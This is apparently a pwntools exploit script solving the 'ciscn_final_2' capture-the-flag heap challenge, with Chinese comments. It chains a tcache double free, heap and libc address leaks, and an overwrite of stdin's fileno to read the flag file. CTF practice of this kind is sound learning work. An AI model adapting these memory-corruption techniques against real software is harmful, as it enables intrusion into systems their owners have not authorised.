#coding:utf8
from pwn import *
 
sh = process('./ciscn_final_2')
#sh = remote('node3.buuoj.cn',26759)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
malloc_hook_s = libc.symbols['__malloc_hook']
stdin_filno_s = libc.sym['_IO_2_1_stdin_'] + 0x70
 
def add(type,number):
   sh.sendlineafter('which command?','1')
   sh.sendlineafter('TYPE:',str(type))
   sh.sendlineafter('your inode number:',str(number))
 
def delete(type):
   sh.sendlineafter('which command?','2')
   sh.sendlineafter('TYPE:',str(type))
 
def show(type):
   sh.sendlineafter('which command?','3')
   sh.sendlineafter('TYPE:',str(type))
 
#0
add(1,0x0ABCDEF)
delete(1)
#1~4
for i in range(4):
   add(2,0xCDEF)
#构造double free
delete(2)
#注意值必须设置为0，这样不影响后面的tcache堆next指针的判断
add(1,0) #1
delete(2)
#gdb.attach(sh)
#泄露堆地址低4字节
show(2)
sh.recvuntil('your short type inode number :')
heap_low_2byte = int(sh.recvuntil('\n',drop = True))
if heap_low_2byte < 0:
   heap_low_2byte += 0x10000
print 'heap_low_2byte=',hex(heap_low_2byte)
#将tcahce节点的next指针指向chunk1
add(2,heap_low_2byte - 0xA0)
#gdb.attach(sh)
add(2,0)
#gdb.attach(sh)
#1放入tcache bin
delete(1)
#gdb.attach(sh)
#修改chunk1的size
add(2,0x30 + 0x20 * 3 + 1)
#gdb.attach(sh)
#不断free chunk，直到填满tcache bin
for i in range(7):
   delete(1)
   #为了复原标志
   add(2,0)
#得到unsorted bin
delete(1)
#泄露main_arena_xx后4字节
show(1)
sh.recvuntil('your int type inode number :')
main_arena_low_4byte = int(sh.recvuntil('\n',drop = True))
if main_arena_low_4byte < 0:
   main_arena_low_4byte += 0x100000000
malloc_hook_low_4byte = (main_arena_low_4byte & 0xFFFFF000) + (malloc_hook_s & 0xFFF)
libc_base_low_4byte = malloc_hook_low_4byte - malloc_hook_s
stdin_filno_low_4byte =  libc_base_low_4byte + stdin_filno_s
print 'libc_base_low_4byte=',hex(libc_base_low_4byte)
print 'stdin_filno_low_4byte=',hex(stdin_filno_low_4byte)
#低字节覆盖tcache bin的next指针，使得其指向stdin结构体的fileno成员
add(2,stdin_filno_low_4byte & 0xFFFF)
gdb.attach(sh)
add(1,0)
#申请到stdin_filno处，修改stdin结构体的fileno为flag文件的fileno
add(1,666)
#scanf从fileno里读出数据，由于fileno被篡改，因此读取的是我们的flag文件
sh.sendlineafter('which command?','4')
 
sh.interactive()
